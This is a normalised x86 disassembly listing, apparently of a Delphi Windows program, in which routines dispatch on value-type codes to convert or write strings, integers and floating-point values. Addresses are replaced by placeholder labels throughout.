mov eax [ eax - 0x14 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
pop esi
pop ebx
pop ebp
retn
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408180
test al al
jne r-xdata
mov al 0x1
sub_41fdd4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
sete al
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150d8
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
call sub_41fd94
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
sub_41fe2c
push ebp
mov ebp esp
push ecx
push ebx
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4150d8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push ebp
call sub_41fdd4
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41fdd4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41feac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41ff58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff5f
lea eax [ ebp - 0x8 ]
call sub_405ab8
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415a88
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d824
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41fd94
pop ecx
mov ebx eax
sub_41ff78
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_420035
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415a88
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d824
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42003c
lea eax [ ebp - 0x10 ]
call sub_405ab8
lea eax [ ebp - 0xc ]
call sub_405ab8
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415a88
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41feac
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_420054
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4159ac
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4159ac
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_4035d8
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4200cc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_420153
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41592c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_4145c4
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41592c
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_414638
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42015a
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404bb4
retn
sub_420164
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41fbc8
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_420226 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4150d8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
push ebp
call sub_41fbf8
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fc50
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fd04
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fe2c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_420054
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_4200cc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41fcac
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41ff78
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4150d8
test [ eax + 0x24 ] 0x4
je r-xdata
sub_4202cc
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_420314
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40437c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4210dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42031b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_420320
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_4203a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_414e50
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_421328
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414e5c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_421140
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_421140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4203ad
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_4203b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_420414
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_4184e4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41f9e0
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41f91c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42041b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_420420
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4204b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041b0
xor eax eax
push ebp
push sub_420499
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_404118
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41f220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4204a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_40416c
retn
sub_4204c4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_420578
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150d8
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_4203b4
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42057f
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f1d0
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414e5c
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f91c
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_420320
pop ecx
jmp r-xdata
jmp r-xdata
sub_420584
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415608
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f88c
mov esp ebp
pop ebp
retn
sub_4205c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415a24
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41fa54
pop ecx
pop ecx
pop ebp
retn
sub_420600
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_420655
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41544c
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_421274
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42065c
lea eax [ ebp - 0x4 ]
call sub_4047f8
retn
sub_420678
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_420767
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40416c
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40416c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42076e
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_404118
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_404424
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_420660
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404498
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_420678
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_404498
jmp r-xdata
sub_4207a0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420994
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4150d8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_421328
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42099b
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_40413c
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_4041b0
xor eax eax
push ebp
push sub_420915
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_40437c
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_404498
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41fb00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_40416c
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4150d8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_420678
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41f91c
jmp r-xdata
sub_4209ac
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_420a69
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415a88
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d824
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_421328
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420a70
lea eax [ ebp - 0xc ]
call sub_404118
lea eax [ ebp - 0x8 ]
call sub_405ab8
lea eax [ ebp - 0x4 ]
call sub_405ab8
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_420678
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41f91c
sub_420a88
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420b23
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4159ac
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_4035d8
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_40437c
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f91c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_421328
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b2a
lea eax [ ebp - 0xc ]
call sub_404118
retn
sub_420b30
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420b89
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_41592c
mov eax [ ebp + 0x8 ]
push eax
call sub_4202cc
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b90
lea eax [ ebp - 0x10 ]
call sub_40f510
retn
sub_420b94
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_42133c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_420164
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41fbc8
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4150d8
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420c52 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4150d8
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_4204c4
pop ecx
jmp r-xdata
push ebp
call sub_420584
pop ecx
jmp r-xdata
push ebp
call sub_420600
pop ecx
jmp r-xdata
push ebp
call sub_4207a0
pop ecx
jmp r-xdata
push ebp
call sub_420a88
pop ecx
jmp r-xdata
push ebp
call sub_420b30
pop ecx
jmp r-xdata
push ebp
call sub_4205c4
pop ecx
jmp r-xdata
push ebp
call sub_4209ac
pop ecx
sub_420ce0
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4210bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414718
test al al
je r-xdata
mov eax ebx
call sub_4145b0
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40be48
call sub_403ad0
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411804
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f8f8
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40feb4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f9e0
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412f3c
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_421274
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4210c3
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x34 ]
call sub_405ab8
lea eax [ ebp - 0x30 ]
call sub_404118
lea eax [ ebp - 0x2c ]
call sub_4047f8
lea eax [ ebp - 0x1c ]
call sub_405ab8
retn
xor eax eax
push ebp
push sub_421060
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_414a10
test al al
je r-xdata
jmp [ eax * 4 + jump_table_420d5e ]
mov eax ebx
call sub_410978
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41fa54
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_4112bc
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412814
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_421220
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_405ab8
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_413514
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d824
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_421328
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421328
jmp r-xdata
mov eax ebx
call sub_411804
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f8b0
jmp r-xdata
mov eax ebx
call sub_411804
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f88c
jmp r-xdata
mov eax ebx
call sub_412160
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41f8d4
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412814
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_421220
jmp r-xdata
jmp r-xdata
mov dl 0x8
